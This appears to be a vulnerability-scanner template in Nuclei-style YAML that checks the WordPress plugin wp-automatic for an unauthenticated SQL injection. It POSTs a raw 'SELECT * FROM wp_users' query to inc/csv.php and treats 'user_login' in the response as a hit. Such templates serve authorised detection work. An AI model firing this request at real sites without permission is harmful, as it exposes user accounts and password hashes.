  - id: wp-automatic-sqli-probe
    method: POST
    path: ["{{BaseURL}}/wp-content/plugins/wp-automatic/inc/csv.php"]
    headers:
      User-Agent: "{{rand_user_agent}}"
      Content-Type: "application/x-www-form-urlencoded"
    body: "q=SELECT%20*%20FROM%20wp_users%20WHERE%201%3D1&auth=%20&integ="
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        part: body
        words: ["user_login"]
        condition: or
    internal: true
